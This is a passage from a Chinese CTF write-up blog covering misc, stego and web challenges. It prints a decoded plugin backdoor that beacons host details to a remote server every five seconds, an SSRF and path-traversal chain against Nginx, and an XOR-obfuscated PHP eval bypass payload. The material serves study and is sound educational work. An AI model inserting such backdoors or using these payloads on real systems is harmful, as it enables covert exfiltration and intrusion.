print(line[4:6]) nums.append(int(line[4:6],16))print(nums)result=&quot;&quot;for item in nums: try: result+=mappings[item] except: pass print(result)print(result) 得到AUTOKEY9'8888'0.DECIPHEER9'MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXO[DEL]PZE[DEL]IZ'0，其中[Del]是指Backspace键的向前删除，不是Del键的向后删除。因此我们要解的密文为\"MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXPZIZ\"，Autokey加密。Google一下\"Autokey cipher brute force\"，搜到了这篇文章，下面有爆破脚本，要配合其他文件，一并放上。网站上的是Python2版本，我给改成3版的了。 break_autokey.py1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465from ngram_score import ngram_scorefrom pycipher import Autokeyimport refrom itertools import permutationsqgram = ngram_score(&#x27;quadgrams.txt&#x27;)trigram = ngram_score(&#x27;trigrams.txt&#x27;)ctext = &#x27;MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXPZIZ&#x27;ctext = re.sub(r&#x27;[^A-Z]&#x27;, &#x27;&#x27;, ctext.upper())# keep a list of the N best things we have seen, discard anything elseclass nbest(object): def __init__(self, N=1000): self.store = [] self.N = N def add(self, item): self.store.append(item) self.store.sort(reverse=True) self.store = self.store[:self.N] def __getitem__(self, k): return self.store[k] def __len__(self): return len(self.store)# initN = 100for KLEN in range(3, 20): rec = nbest(N) for i in permutations(&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;, 3): key = &#x27;&#x27;.join(i) + &#x27;A&#x27; * (KLEN - len(i)) pt = Autokey(key).decipher(ctext) score = 0 for j in range(0, len(ctext), KLEN): score += trigram.score(pt[j:j + 3]) rec.add((score, &#x27;&#x27;.join(i), pt[:30])) next_rec = nbest(N) for i in range(0, KLEN - 3): for k in range(N): for c in &#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;: key = rec[k][1] + c fullkey = key + &#x27;A&#x27; * (KLEN - len(key)) pt = Autokey(fullkey).decipher(ctext) score = 0 for j in range(0, len(ctext), KLEN): score += qgram.score(pt[j:j + len(key)]) next_rec.add((score, key, pt[:30])) rec = next_rec next_rec = nbest(N) bestkey = rec[0][1] pt = Autokey(bestkey).decipher(ctext) bestscore = qgram.score(pt) for i in range(N): pt = Autokey(rec[i][1]).decipher(ctext) score = qgram.score(pt) if score &gt; bestscore: bestkey = rec[i][1] bestscore = score print(bestscore, &#x27;autokey, klen&#x27;, KLEN, &#x27;:&quot;&#x27; + bestkey + &#x27;&quot;,&#x27;, Autokey(bestkey).decipher(ctext)) ngram_score.py12345678910111213141516171819202122232425262728293031&#x27;&#x27;&#x27;Allows scoring of text using n-gram probabilities17/07/12&#x27;&#x27;&#x27;from math import log10class ngram_score(object): def __init__(self, ngramfile, sep=&#x27; &#x27;): &#x27;&#x27;&#x27; load a file containing ngrams and counts, calculate log probabilities &#x27;&#x27;&#x27; self.ngrams = &#123;&#125; for line in open(ngramfile).readlines(): key, count = line.split(sep) self.ngrams[key] = int(count) self.L = len(key) self.N = sum(self.ngrams.values()) # calculate log probabilities for key in list(self.ngrams.keys()): self.ngrams[key] = log10(float(self.ngrams[key]) / self.N) self.floor = log10(0.01 / self.N) def score(self, text): &#x27;&#x27;&#x27; compute the score of text &#x27;&#x27;&#x27; score = 0 ngrams = self.ngrams.__getitem__ for i in range(len(text) - self.L + 1): if text[i:i + self.L] in self.ngrams: score += ngrams(text[i:i + self.L]) else: score += self.floor return score 相应的英文quadgrams.txt和trigrams.txt。跑一遍会发现klen=8时发现flag-674.9145695645551 autokey, klen 8 :\"FLAGHERE\", HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF，所以flag是flag{JHAWLZKEWXHNCDHSLWBAQJTUQZDXZQPF}。 后附USB HID规范： Printer [给了个USB流量包，打开发现有BULK_OUT，那就不是键盘或者鼠标了。按照包大小排序，476、674、675不对劲，这三个包出现了明文。在476包里看到了CLS:PRINTER，猜测是打印机的数据。搜一下是什么指令集2MFG:4BARCODE;CMD:TSPL2;MDL:3B-363B;CLS:PRINTER;。发现应该是BarTender的4BARCODE Seagull打印机，紧接着就看到了指令集文档。TSPL/TSPL2语言，重点是出现的BAR和BITMAP指令。那就Python画图吧。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697from PIL import Imageimg = Image.new(&quot;RGB&quot;, (1024, 1024), &quot;white&quot;)def drawbar(): commands = r&#x27;&#x27;&#x27;BAR 348, 439, 2, 96BAR 292, 535, 56, 2BAR 300, 495, 48, 2BAR 260, 447, 2, 88BAR 204, 447, 56, 2BAR 176, 447, 2, 96BAR 116, 455, 2, 82BAR 120, 479, 56, 2BAR 44, 535, 48, 2BAR 92, 455, 2, 80BAR 20, 455, 72, 2BAR 21, 455, 2, 40BAR 21, 495, 24, 2BAR 45, 479, 2, 16BAR 36, 479, 16, 2BAR 284, 391, 40, 2BAR 324, 343, 2, 48BAR 324, 287, 2, 32BAR 276, 287, 48, 2BAR 52, 311, 48, 2BAR 284, 239, 48, 2BAR 308, 183, 2, 56BAR 148, 239, 48, 2BAR 196, 191, 2, 48BAR 148, 191, 48, 2BAR 68, 191, 48, 2BAR 76, 151, 40, 2BAR 76, 119, 2, 32BAR 76, 55, 2, 32BAR 76, 55, 48, 2BAR 112, 535, 64, 2BAR 320, 343, 16, 2BAR 320, 319, 16, 2BAR 336, 319, 2, 24BAR 56, 120, 24, 2BAR 56, 87, 24, 2BAR 56, 88, 2, 32BAR 224, 247, 32, 2BAR 256, 215, 2, 32BAR 224, 215, 32, 2BAR 224, 184, 2, 32BAR 224, 191, 32, 2BAR 272, 311, 2, 56BAR 216, 367, 56, 2BAR 216, 319, 2, 48BAR 240, 318, 2, 49BAR 184, 351, 2, 16BAR 168, 351, 16, 2BAR 168, 311, 2, 40BAR 152, 351, 16, 2BAR 152, 351, 2, 16&#x27;&#x27;&#x27; for line in commands.splitlines(): line_data = line[3:].replace(&quot; &quot;, &quot;&quot;).split(&quot;,&quot;) x = int(line_data[0]) y = int(line_data[1]) width = int(line_data[2]) height = int(line_data[3]) for a in range(x + width, x, -1): for b in range(y + height, y, -1): img.putpixel((a, b), (255, 0, 0))def drawbarcode(): data1 = bin(int( &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC3FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE7FFE3FFFE1FFFFFFFFFF807C03C603FC07C07E0007F7FF01F8067FF007FF803FC07C03FFF1FF1F04F8FF1FF1FFF1FFF3FFCFF1F27FC7F1FF3E1FF1FF9FFFF1FF1FC1FCFF8FF1FFF1FFF3FFEFE3F87F8FF9FEFF8FF1FF9FFFF8FF1FC3FC7FCFF1FFF1FFF1FFEFC7FC7F9FF8FDFFC7F1FF9FFFF8FF1FC7FE3FC7F1FFF1FFF1FFEFCFFE7F1FF8F9FFC3F1FF9FFFFC7F1FC7FE3FE3F1FFF1FFF0FFEF8FFE7F1FF0FBFFE3F1FF9FFFFC7F1FC7FE3FE3F1FFF1FFF0FFEF8FFE7E1FF8F3FFE3F1FF9FFFFE3F1FC7FE3FF1F1FFF1FFF47FEF8FFE7E3FF9F7FFE1F1FF9FFFFE3F1FC7FF3FF8E1FFF1FFF47FEF9FFE7E3FFFFFFFF1F1FF9FFFFF1F1FC7FF3FF8C1FFF1FFF63FEF9FFE7F1FFFFFFFF1F1FF9FFFFF1F1FC7FF3FFC11FFF1FFF63FEF9FFE7F1FFFFFFFF1F1FF9FFFFF1F1FC7FE3FFE31FFF1FFF71FEF9FFE7F1FFFFFFFF1F1FF9FFFFF8F1FC7FE3FFE71FFF1FFF71FEF8FFE7F8FFFFFFFF0F1FF9FFFFF8F1FC7FE3FFCF1FFF1FFF78FEF8FFE7FCFFFFFFFF0F1FF9FFFFFC61FC7FE7FF9F1FFF1FFF78FEF8FFC7FE3FFFFFFF0F1FF9FFFFFC41FC7FC7FF3F1FFF1FFF7C7EFCFFC7FF83FFFFFF0F9FF1FFFFFE11FC3F8FFF7F1FFF1FFF7C7EFC7FA7FF87FFFFFF0F9FE9FFFFFE31FC1F1FFE7F1FFF1FFF7E3EFE3E67FE3FFFFFFF1F8F99FFFFFF31FC403FE01F1FFF1FFF7E3EFF80E0FC7FFFFFFF1FC039FFFFFE71FC79FFFFFF1FFF1FFF7F1EFFF3EFF8FFFFFFFF1FF0F9FFFFFEF1FC7FFFFFFF1FFF1FFF7F0EFFFFFFF8FFFFFFFF1FFFF9FFFFFCF1FC7FFFFFFF1FFF1FFF7F8EFFFFFFF8FFFFFFFE1FFFF9FFFFF9F1FC7FFFFFFF1FFF1FFF7F86FFFFFFF8FF9F7FFE3FFFF9FFFFFBF1FC7FFFFFFF1FFF1FFF7FC6FFFFFFF8FF0F3FFE3FFFF9FFFFF7F1FC7FFFFFFF1FFF1FFF7FC2FFFFFFF8FF8FBFFC7FFFF9FFFFE7F1FC7FFFFFFF1FFF1FFF7FE2FFFFFFF8FF8F9FFC7FFFF9FFFFCFF1FC7FFFFFFF1FFF1FFF7FF0FFFFFFFCFF9F9FF8FFFFF9FFFF8FF1FC7FFFFFFF1FFF1FFF7FF0FFFFFFFC7F9F8FF1FFFFF9FFFF0FF0FC3FFFFFFF1FFF0FFE7FF8FFFFFFFE1E7F83E3FFFFF8FFFC03C03C0FFFFFFF03E000780FF83FFFFFFF80FFF80FFFFFF83FFFFFFFFDFFFFFFFF3FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF&quot;, 16))[2:] data2 = bin(int( &quot;FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFC7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFE38FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFF7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF9FF3FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF9FF3FFFFFFFFFFFFF9FFEFBFFC7FFFFFFE1FFF8FFFFFFFC3FFFFFFFFFF9FF3FF8FFFFFFFFFF0FFEFBFF39FF007F9C7FE72FFFFFF3C3FC07FFFFF87E78463F803FF01F0FFE7BFEFEFFF7FF3F3F9F8FFFFFEFF3FFBFFFFFFC01FA3F9FFBFFFE7F9FFE71FCFE7FF7FF7F9F9FCFFFFFEFFBFFBFFFFFFFC07E7F9FFBFFFE7FFFFC71F9FF3FF7FEFF9F3FCFFFFFEFFBFFBFFFFFFFFE7E7F8FFBFFFE7FFFFD75F9FF3FF7FFFFCF3FCFFFFFE7FFFFBFFFFFFFFE7E7F9FFBFFFE7FFFFD35F9FF3FF7FFFFCF3FCFFFFFE3FFFFBFFFFFFF80FE7F9FFBFFFE7FFFFD2CF9FF3FF7FFFFCF3FCFFFFFF07FFFBFFFFFFF7CFE7F3FFBFFFE7FFFFB2CF9FF3FF7FE000F3FCFFFFFFC1FFFBFFFFFFE7E7E7C7FFBFFFE7FFFFBACF9FF3FF7FE7FCF3FCFFFFFFF87FFBFFFFFFE7E7E03FFFBFFFE7FFFFB9EF9FF3FF7FE7FCF3FCFFFFFFFE7FFBFFFFFFEFE7E7FFFFBFFFE7FFFFB9E79FF3FF7FE7F9F3FCFFFFFEFF3FFBFFFFFFEFE7E7F9FFBFFFE7FFFF79E7CFE7FF7FF3F9F9F8FFFFFEFF3FFBFFFFFFE7E7F7F1FFBFFFE7F1FF79E7EFCFFF7FF3F3F9F0FFFFFE7F7FFBFFFFFF27EFF3F3FFBFFFE7F0FE38E3F39FFF7FFCE7FC04FFFFFE1CFFF9FFFFFF019FF9E7FFBFFFE7F1FFFFFFFC7FFF7FFF1FFFBCFFFFFEE3FFF87FFFFFBE7FFE1FFFBFFE00FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFE7FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFE7FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFFFE7FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFFFFFFFFFFFFFFFFFFFBFE7E7FFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFF3FFFFFFFFFFFFFFFFBFE7EFFFFFFFFFFFFFFF7FFFFFFFFCFFFFFFFFFFF1FFFFFFFFFFFFFFFFBFE7CFFFFFFFFFFFFFFF03FFFFFFFC3FFFFFFFFFF1FFFFFFFFFFFFFFFF81F03FFFFFFFFFFFFFFF3FFFFFFFFCFFFFFFFFFFFBFFFFFFFFFFFFFFFF9FFFFFF&quot;, 16))[2:] step = 208 temp1 = [data1[i:i + step] for i in range(0, len(data1), step)] print(temp1) print(len(temp1)) for b in range(75, 75 + 26 * 8): for a in range(138, 138 + 48): if temp1[a - 138][b - 75] == &#x27;1&#x27;: img.putpixel((b, a), (255, 0, 0)) step = 232 temp2 = [data1[i:i + step] for i in range(0, len(data1), step)] for a in range(130, 130 + 32): for b in range(579, 579 + 29 * 8): if temp2[a - 130][b - 579] == &#x27;1&#x27;: img.putpixel((b, a), (255, 0, 0))drawbar()drawbarcode()img.show() 坐标位置弄错了，不过不影响解题，data1是flag另一半，data2不影响。 本题flag全小写字母。 另附一份TSPL/TSPL2的文档。 Worm in Apple 给了个压缩包，description.md的提示内容： A guy I met on the Internet wanted me to test its new ST3 plugin. I have a bad feeling about this... Maybe you can tell me if I'm right to be worried? Investigate as far as you can. 我们的目标是一个Sublime Text3（下面简称ST3）的插件。之前没玩过ST3的插件开发，看文档。文档写的很明白，sublime-package文件是个zip，包含plugin、代码片段等内容，而ST3的插件开发用的是Python。我们把给的DoxyDoxygen解压后，发现Doxy.py，打开看看，发现版权信息__copyright__ = \"Copyright (c) 2015-2018 Sebastien Recio, all rights reserved\"，那么题目所给插件不是自己写的，是原版改的？去Packagecontrol.io上果然有，那么就对着package-metadata.json写的版本号0.63.3下一个原版。Beyond Compare文件夹对比一下，发现题目给的插件里Doxy.py多了几行： 1234try: import base64;A=b&#x27;IyAgICAgICAvIVwgRk9SIEVEVUNBVElPTkFMIFBVUlBPU0UgT05MWSAvIVwKQT0nNy4yemJ2LWJuMDB5cmNwNHNjdi0zcnA1MnY0OWJ2LTNuY3MyJwpCPTQ0MwpDPScwMTIzNDU2Nzg5YWJjZGVmZ2hpamtsbW5vcHFyc3R1dnd4eXotLicKaW1wb3J0IHRpbWU7aW1wb3J0IHJlcXVlc3RzO2ltcG9ydCBwbGF0Zm9ybTtmcm9tIHV1aWQgaW1wb3J0IHV1aWQ0O2Zyb20gdGhyZWFkaW5nIGltcG9ydCBUaHJlYWQKZGVmIHcoKToKICAgIGksdT1zdHIodXVpZDQoKSksJ2h0dHBzOi8ve306e30ve30nLmZvcm1hdCgnJy5qb2luKFtDWyhDLmluZGV4KGUpLTB4MGQpJWxlbihDKV0gZm9yIGUgaW4gQV0pLEIsJycuam9pbihbY2hyKGVeMHg0MikgZm9yIGUgaW4gWzQ0LDQ1LDU0LDQzLDM2LDU5XV0pKQogICAgd2hpbGUgVHJ1ZTpyZXF1ZXN0cy5wb3N0KHUsanNvbj17J3V1aWQnOmksJ25vZGUnOnBsYXRmb3JtLm5vZGUoKSwncGxhdGZvcm0nOnBsYXRmb3JtLnBsYXRmb3JtKCl9KTt0aW1lLnNsZWVwKDUpCnQ9VGhyZWFkKHRhcmdldD13KQppZiBfX25hbWVfXyA9PSAnX19tYWluX18nOnQuc3RhcnQoKTt0LmpvaW4oKQplbHNlOnQuZGFlbW9uPVRydWU7dC5zdGFydCgpCg==&#x27;;exec(base64.b64decode(A));except: pass Base64解完整理一下： 1234567891011121314# /!\\\\ FOR EDUCATIONAL PURPOSE ONLY /!\\\\A=&#x27;7.2zbv-bn00yrcp4scv-3rp52v49bv-3ncs2&#x27;B=443C=&#x27;0123456789abcdefghijklmnopqrstuvwxyz-.&#x27;import time;import requests;import platform;from uuid import uuid4;from threading import Threaddef w(): i,u=str(uuid4()),&#x27;https://&#123;&#125;:&#123;&#125;/&#123;&#125;&#x27;.format(&#x27;&#x27;.join([C[(C.index(e)-0x0d)%len(C)] for e in A]),B,&#x27;&#x27;.join([chr(e^0x42) for e in [44,45,54,43,36,59]])) while True: requests.post(u,json=&#123;&#x27;uuid&#x27;:i,&#x27;node&#x27;:platform.node(),&#x27;platform&#x27;:platform.platform()&#125;);time.sleep(5)t=Thread(target=w)if __name__ == &#x27;__main__&#x27;: t.start();t.join()else: t.daemon=True;t.start() 稍微调一下发现它会每5s向https://worm-in-apple.ctf.insecurity-insa.fr:443/notify这个地址POST方式提交一个uuid4()。 BUUOJ上没Web端，暂时没法做了。。 She 是个游戏，看Data目录一堆rxdata文件，搜一下发现是RPG Maker XP制作的，下载后新建工程，保存后把工程文件放到给的She目录下即可编辑当前游戏了。 以防万一，先调出数据库，把主角的武器伤害拉满，把敌人的血量、攻击、防御拉到最低。然后进入左下角那个房间干掉Boss，会开启一个门。进了门来到一个地牢（？），提示我们不能碰到吸血鬼，那就在地图编辑器里把ROOM1-3的吸血鬼删掉。看ROOM4的几个事件，提示Magic Mirror:Combine those numbers you found in the chest and submit it with MD5 encrypt!。就是让我们去找开门的顺序。然后就发现ROOM2的左边和右边的门没法开，左边的门因为没有影响0039:14变量的条件无法开，右边的门压根就没有设计开的选项。ROOM3右边的门同样，没有影响0029:4的变量，也没法开。那么剩下的门总可以开启，对应的数字按照门从左向右排列的顺序对应为213697。然后让我们算MD5，试了半天发现就是这个顺序。（yysy，没看到Bad Door造成的影响。） flag{eeb61c77-b3b4-4bdc-a119-ce65a2950e3a}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/tags/Misc/"},{"name":"BUUOJ","slug":"BUUOJ","permalink":"http://tiaonmmn.github.io/tags/BUUOJ/"},{"name":"Stego","slug":"Stego","permalink":"http://tiaonmmn.github.io/tags/Stego/"},{"name":"USB","slug":"USB","permalink":"http://tiaonmmn.github.io/tags/USB/"},{"name":"打印机","slug":"打印机","permalink":"http://tiaonmmn.github.io/tags/%E6%89%93%E5%8D%B0%E6%9C%BA/"}]},{"title":"MyHexo","slug":"MyHexo","date":"2019-08-22T09:38:37.000Z","updated":"2020-09-01T13:34:47.679Z","comments":true,"path":"2019/08/22/MyHexo/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/22/MyHexo/","excerpt":"","text":"记录一下用Hexo以来踩过的坑。 插件 用到的插件有： hexo-tag-aplayer hexo-word-count hexo-blog-encrypt（配置了加密的博文和aplayer冲突） hexo-related-popular-posts hexo-generator-json-content（icarus主题的insight搜索） hexo-filter-mathjax hexo-renderer-pandoc hexo-generator-searchdb theme-next/theme-next-calendar（日历） theme-next/hexo-next-share（分享按钮） theme-next/hexo-next-title（窗口失去焦点后换标题） theme-next/hexo-next-coauthor（副作者） theme-next/hexo-filter-emoji（Github表情） Next 我比较喜欢大而全的主题，所以用的Next。然后，没事不要轻易升级next。要升也是大版本升级。next的github那里基本上没有认真验证能否跑通的。 延迟 github和tencent的平台有延迟，基本上要等5分钟左右再去访问。 &amp; &lt; &gt; Hexo博文的标题不能出现“&amp;”、“&lt;”、“&gt;”这些字符。否则local-search会没法用。 flag{9e047d10-c4c0-11e9-a2e4-1914e95dcfd8}","categories":[{"name":"Misc","slug":"Misc","permalink":"http://tiaonmmn.github.io/categories/Misc/"}],"tags":[{"name":"Hexo","slug":"Hexo","permalink":"http://tiaonmmn.github.io/tags/Hexo/"}]},{"title":"Midnightsun-Bigspin","slug":"Midnightsun-Bigspin","date":"2019-08-20T08:23:15.000Z","updated":"2019-12-10T12:15:12.668Z","comments":true,"path":"2019/08/20/Midnightsun-Bigspin/","link":"","permalink":"http://tiaonmmn.github.io/2019/08/20/Midnightsun-Bigspin/","excerpt":"放假各种摸鱼，今天来个不一样的Web题。Midnightsun 2019 Quals CTF的Bigspin。 Part 1.代理","text":"放假各种摸鱼，今天来个不一样的Web题。Midnightsun 2019 Quals CTF的Bigspin。 Part 1.代理 打开页面后很直接，给了四个链接：uberadmin、admin、user和pleb，点进去发现uberadmin 403、admin 404、user 403、pleb对应一个Example Domain的页面（后来发现是一个叫做https://www.example.com的网站）。开始以为会是从pleb下手，然后发现各种链接返回同样的内容。 看一下HTTP响应头，Web服务器为Nginx，可能会出现路径穿越问题。访问http://xxx.xxx.xxx.xxx/pleb../，发现返回了个502 Bad Gateway？这就有意思了。正常情况下的路径穿越只会返回200或者404，502是什么东西？Google到这个东西，上面提到三条原因，其中第一个Domain name not resolvable有点意思，这让我们猜测/pleb/下有一个代理。/pleb../返回502的原因猜测为没有www.example.com../这个域名，因为它确实不合法。 那么我们现在的想法是：通过某种方式，将代理指向题目服务器（127.0.0.1），访问。 然后就到重点了，确实有这种网站，能将任意DNS域名转为IP域名：https://nip.io。我们来测试一下：访问http://xxx.xxx.xxx.xxx/pleb-yyy.yyy.yyy.yyy.nip.io/ 那么我们试一下最开始无法打开的uberadmin等路径： Part 2.Nginx配置 user目录下有一个nginx.cönf文件，我们没办法直接打开。Nginx对于Unicode字符支持不是很好，我们可以通过两次URL编码打开文件。即访问http://127.0.0.1:5631/pleb.127.0.0.1.nip.io/user/nginx.c%25c3%25b6nf，可以得到nginx的配置文件。 1234567891011121314151617181920212223242526272829303132333435363738events &#123; worker_connections 1024;&#125;http &#123; resolver 8.8.8.8 ipv6=off; server &#123; listen 80; location / &#123; root /var/www/html/public; try_files $uri $uri/index.html $uri/ =404; &#125; location /user &#123; allow 127.0.0.1; deny all; autoindex on; root /var/www/html; &#125; location /admin &#123; internal; autoindex on; alias /var/www/html/admin/; &#125; location /uberadmin &#123; allow 13.3.7.233; deny all; autoindex on; alias /var/www/html/uberadmin; &#125; location ~ /pleb([/a-zA-Z0-9.:%]+) &#123; proxy_pass http://example.com$1; &#125; &#125;&#125; uberadmin只允许IP为13.3.7.233访问，暂时没法绕过。而admin有个很有趣的internal选项。找到文档，其中一条特别有意思：requests redirected by the “X-Accel-Redirect” response header field from an upstream server;就是说如果远程服务器发送了X-Accel-Redirect头，nginx会将其认为是internal访问进行跳转。 那么思路就很明确了：远程服务器发送HTTP头请求，题目接受并跳转即可。PHP就可以了。 1234567&lt;?phpheader(&quot;X-Accel-Redirect: /admin/&quot;);?&gt; 放到远程服务器上，然后在题目端访问就可以列admin目录内容了。 但是我们没法直接打开，需要修改服务器的PHP文件才能访问。然后我们得到了个假flag提示uberadmin下有真正的flag。 uberadmin仅允许特定IP访问，没法直接访问到，但是注意看nginx文件的写法：/admin，而不是/admin/，存在路径穿越。因此改路径成/admin../uberadmin/flag.txt即可拿到真正的flag。 flag{e92273c1-52fc-47c5-a6f4-10a1b6577ce7}","categories":[{"name":"Writeups","slug":"Writeups","permalink":"http://tiaonmmn.github.io/categories/Writeups/"}],"tags":[{"name":"Web","slug":"Web","permalink":"http://tiaonmmn.github.io/tags/Web/"},{"name":"Nginx","slug":"Nginx","permalink":"http://tiaonmmn.github.io/tags/Nginx/"},{"name":"nip.io","slug":"nip-io","permalink":"http://tiaonmmn.github.io/tags/nip-io/"}]},{"title":"ISITDTU-Easy PHP","slug":"ISITDTU-Easy-PHP","date":"2019-07-18T13:34:22.000Z","updated":"2019-12-10T12:15:12.666Z","comments":true,"path":"2019/07/18/ISITDTU-Easy-PHP/","link":"","permalink":"http://tiaonmmn.github.io/2019/07/18/ISITDTU-Easy-PHP/","excerpt":"本来都弃坑Web了，然后发现自己还在CTFTraining项目里，放假快一个月天天咸鱼，稍微做点工作吧。 ISITDTU CTF 2019的Easy PHP，题目描述：Don't try to run any Linux command, just use all the PHP functions you know to get the flag。言简意赅。","text":"本来都弃坑Web了，然后发现自己还在CTFTraining项目里，放假快一个月天天咸鱼，稍微做点工作吧。 ISITDTU CTF 2019的Easy PHP，题目描述：Don't try to run any Linux command, just use all the PHP functions you know to get the flag。言简意赅。 123456789101112&lt;?phphighlight_file(__FILE__);$_ = @$_GET[&#x27;_&#x27;];if ( preg_match(&#x27;/[\\x00- 0-9\\&#x27;&quot;`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;, $_) ) die(&#x27;rosé will not do it&#x27;);if ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd ) die(&#x27;you are so close, omg&#x27;);eval($_);?&gt; 核心就是绕那两个if。第一个正则有点复杂，这里推荐个网站，方便调试正则。总而言之，那个正则的意思是匹配00到空格()的字符，0到9的数字、\"$&amp;.,|[&#123;_defgops以及DEL（7f）字符。如果你提交的字符串出现上述字符，die。第二个if表示我们提交的字符串一共不能出现多于13种不同的字符。换言之，允许出现的字符如下：!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\\]^abchijklmnqrtuvwxyz&#125;~。 那么，我们先来看看PHP内置函数符合上述条件的有哪些。 12345678&lt;?php$array=get_defined_functions();foreach($array[&#x27;internal&#x27;] as $arr)&#123; if ( preg_match(&#x27;/[\\x00- 0-9\\&#x27;&quot;\\`$&amp;.,|[&#123;_defgops\\x7F]+/i&#x27;, $arr) ) continue; if ( strlen(count_chars(strtolower($arr), 0x3)) &gt; 0xd ) continue; print($arr.&#x27;&lt;br/&gt;&#x27;);&#125;?&gt; 然后我们得到如下列表： bcmul ltrim rtrim trim chr link unlink tan atan atanh tanh intval mail min max 这些函数跟文件读取没有任何关系。。。。那么我们如何在没有引号的情况下得到任意字符串呢？ PHP在处理字符串时有个有趣的特性。 PHP默认会把没有加引号的字符串当成常量处理，找不到对应常量就会将其解释成字符串，因此没有引号不是限制。 还有一点，PHP调用函数，可以使用字符串调用。 注意到^符号没有被ban，那么我们就可以通过对字符串进行运算来规避if了。 1234567final_string=&quot;phpinfo&quot;allowed=&quot;!#%()*+-/:;&lt;=&gt;?@ABCHIJKLMNQRTUVWXYZ\\]^abchijklmnqrtuvwxyz&#125;~&quot;for a in final_string: for i in allowed: for p in allowed: if ord(i)^ord(p)==ord(a): print(&quot;i=%s p=%s a=%s&quot;%(i,p,a)) 暴力搜索符合条件的字符串，例如：phpinfo==%8f%97%8f%96%91%99%90^%ff%ff%ff%ff%ff%ff%ff。 从phpinfo返回中可以看到所有命令执行的函数都被ban了，加上mail和imap_mail。同时也限制了open_basedir在/var/www/html。下一步是找flag文件。我们可以用scandir或者glob列目录，但它返回一个数组，我们还需要一个print_r或var_dump。 即目标为print_r(scandir('.'));==((%8f%8d%96%91%8b%a0%8d)^(%ff%ff%ff%ff%ff%ff%ff))(((%8c%9c%9e%91%9b%96%8d)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff));。发现可以运行，但是count_chars那里过不去，我们一共用了16个不同字符，下一步是缩减字符数。我采用一种粗暴的方法： 123456789101112131415result2 = [0x8b, 0x9b, 0xa0, 0x9c, 0x8f, 0x91, 0x9e, 0xd1, 0x96, 0x8d, 0x8c] # Original chars,11 totalresult = [0x9b, 0xa0, 0x9c, 0x8f, 0x9e, 